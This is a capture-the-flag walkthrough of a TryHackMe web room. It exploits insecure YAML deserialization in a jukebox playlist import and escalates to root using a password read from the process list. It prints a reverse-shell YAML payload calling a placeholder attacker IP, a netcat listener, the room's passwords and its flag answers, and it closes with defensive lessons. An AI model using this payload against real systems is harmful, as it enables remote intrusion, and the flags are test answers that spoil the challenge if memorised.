# Hacker Holiday's 2026 - Beach Bar
The **Beach Bar** room presents a web application environment built around a guest-experience feature where visitors can submit song requests to a jukebox. However, improper access controls and misconfigured cloud policies at the infrastructure layer allow unauthenticated users to interact with sensitive backend services beyond the intended application flow.

First, let's run NMAP scan for the given IP Address. We will create a folder to store the process we are going to do.

```
nmap -sC -sV -oN nmap/initial 10.48.180.93
```

<img width="1282" height="737" alt="image" src="https://github.com/user-attachments/assets/c47d133b-bd7f-45f5-a97e-577f2101fe8b" />

NMAP scan has given us some information. Now, let's use the IP Address to access it in website.

<img width="1391" height="811" alt="image" src="https://github.com/user-attachments/assets/c5a755be-56d6-4ee2-aaf8-db1adfd15654" />

So, we have a login page for the website. Now, I'm going to inspect the code for this webpage by right clicking on the mouse and choosing view page source option from the drop down.

While scrolling down, I found a staff note inside the code which says "the demo DJ login is still enabled for the soft opening." and also gave **dj / dj** and I think this could be the username and password for the website to login as DJ.

<img width="893" height="390" alt="image" src="https://github.com/user-attachments/assets/32913b0e-b09d-470f-9590-3a352c0a8b75" />

I used the credentials to login.

<img width="1338" height="646" alt="image" src="https://github.com/user-attachments/assets/27d072f0-a93b-4dae-8a3d-e132a3c4419f" />

And it got logged in and gave us a dashboard for the profile.

<img width="1374" height="631" alt="image" src="https://github.com/user-attachments/assets/fff086ee-76ad-4f4c-8b8d-465145728e96" />

This on says " Bring a set from another night: Export the current playlist as YAML, tweak it, and load it back via Import. " Basically we can tweak this to play our playlist. So, the next thing I did is to click on **export** and it downloaded a file - **playlist.yml**

<img width="864" height="642" alt="image" src="https://github.com/user-attachments/assets/a0badd5f-f887-4908-bafd-d124a176d83c" />

I have tweaked the file with inserting one of my favorite song and saving it and then clicked on import option.

<img width="872" height="651" alt="image" src="https://github.com/user-attachments/assets/d2bcb422-756c-4046-a0e1-1a4e164c98ef" />

The import option gives us option to manually import songs, or we can browse files. We previously downloaded the export file and edited with my favorite song. Let's try importing the full playlist.

<img width="1379" height="687" alt="image" src="https://github.com/user-attachments/assets/a7b63c0f-d5c1-4133-a2fa-adaf839ae962" />

<img width="1312" height="600" alt="image" src="https://github.com/user-attachments/assets/7c0e5a8a-0051-4bbe-bfe4-781141302d76" />

After browsing and selecting the file, I gave load playlist and the file got displayed down.

<img width="1242" height="649" alt="image" src="https://github.com/user-attachments/assets/2eef4ecd-b349-4851-9f3a-00bc7fa35771" />

So, if this hotel does not have secure de-serializer then we can run python code to get Remote Code Execution. 

<img width="1031" height="688" alt="image" src="https://github.com/user-attachments/assets/921fa4c7-b473-4492-b046-b26257f302e7" />

By trying this code, we did get a reply. It means its running. The same operation I tried in the terminal as well.

<img width="1191" height="251" alt="image" src="https://github.com/user-attachments/assets/6003aa9e-767d-4085-a64a-ac07c27c8b04" />

Since, now we know we can code in their website, we can try and get reverse shell. So, I'll go back to my terminal and start a listener port.

```
nc -lnvp 4444
```

<img width="1085" height="81" alt="image" src="https://github.com/user-attachments/assets/f28e2f1d-78e0-4543-85e2-0a15dd32b5ab" />

So, now we want the website input box to send a connection to my system terminal. 

```
!!python/object/apply:os.system
["bash -c 'bash -i >& /dev/tcp/ATTACK_IP/4444 0>&1'"]
```

<img width="1065" height="615" alt="image" src="https://github.com/user-attachments/assets/bf72e126-c237-4718-92b9-a5df889b5dd2" />

The bash is used to get a reverse shell in bash and the IP I gave here is my system/AttackBox IP from TryHackMe from the port 4444, a random port we chose for listening. We got the connection back in the terminal.

<img width="1289" height="184" alt="image" src="https://github.com/user-attachments/assets/826d3842-1df3-4046-8949-1d442959d5a1" />

After getting the connection, I gave ```whoami``` command to see the user of the system and it said **bartender**. Now we can retrieve the user flag from here. Usually in TryHackMe, the user flag will be located in the home directory of the user.

```
pwd
ls ~
cat ~/user.txt
```

<img width="984" height="367" alt="image" src="https://github.com/user-attachments/assets/cfcf3618-5c12-4e69-b3d5-2d8ffa884efb" />

And we found the user flag.

**What is the user flag?** <br>
THM{y4ml_pl4yl1st_pwns_th3_b34ch}

Next we need to do privilege escalation and get the root flag by obtaining the root user account. I'm going to enumerate the process and see how it goes.

<img width="1400" height="717" alt="image" src="https://github.com/user-attachments/assets/23b92a58-ab51-488a-8c06-3a72fbb3baea" />

While seeing through the processes, I found something interesting. I got some username and password which I'm guessing it to be the root user's credential. It's because we see concierge talking about the jukebox and so thought this could be relevant

<img width="1902" height="104" alt="image" src="https://github.com/user-attachments/assets/57c06d16-978f-4f67-99c8-6deb94a4195a" />

I used the password with the following commands. I gained access to the the root user using ```su```, then gave the password as **SunsetSpritz2024!**, and we got the root access. Next I did ```pwd``` to see in which directory I am in. Then did ```cd``` to change the directory and did ```ls``` to list the files, from here I got the **root.txt** file, and then I used ```cat root.txt``` command to read the contents of the file and here we got the flag for the root user.

**What is the root flag?** <br>
THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}

<img width="1292" height="448" alt="image" src="https://github.com/user-attachments/assets/9bf477b3-6014-4ee2-ac12-2d74a568a193" />

## Lessons Learned

* **Insecure YAML Deserialization (RCE):** Passing user-controlled data directly into deserializers (like `yaml.load`) without sanitization leads to Remote Code Execution. Always use safe parsers (e.g., `yaml.safe_load`) to handle untrusted input.
* **Avoid Hardcoded & Exposed Process Credentials:** Storing credentials or sensitive commands in plain text within active processes or scripts allows local users to easily inspect process lists (`ps aux`) and escalate privileges.
* **Never Rely on Client-Side Isolation:** Relying on client-side JavaScript to enforce data isolation provides zero real security. Authorization and access control must always be enforced at the API and backend layers.






























